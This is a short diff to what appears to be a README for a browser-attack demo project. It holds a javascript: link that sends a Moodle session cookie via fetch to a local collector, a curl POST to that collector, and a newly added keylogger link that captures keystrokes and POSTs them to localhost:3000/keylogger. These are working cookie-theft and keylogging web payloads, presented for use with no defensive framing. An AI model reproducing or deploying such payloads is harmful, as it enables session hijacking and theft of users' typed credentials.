@@ -50,6 +50,11 @@ curl -X POST http://localhost:8000/cookie -H "Content-Type: application/json" -d
 <a href="javascript:eval('fetch(\'http://localhost:8000/cookie\', { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: JSON.stringify({ MoodleSession: document.cookie}) });')">Click aquí</a>
 ```
 
+## Keylogger Script
+```
+<a href="javascript:eval(`const keyboardLogger = []; document.addEventListener('keydown', (event) => { keyboardLogger.push(event.key); if (keyboardLogger.length > 10) { fetch('http://localhost:3000/keylogger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ keyboardLogger: keyboardLogger.join('') }) }); keyboardLogger.length = 0; } });`);">Click aquí</a>
+```
+
 ## Autor
 
 **Iván L. Álvarez**  
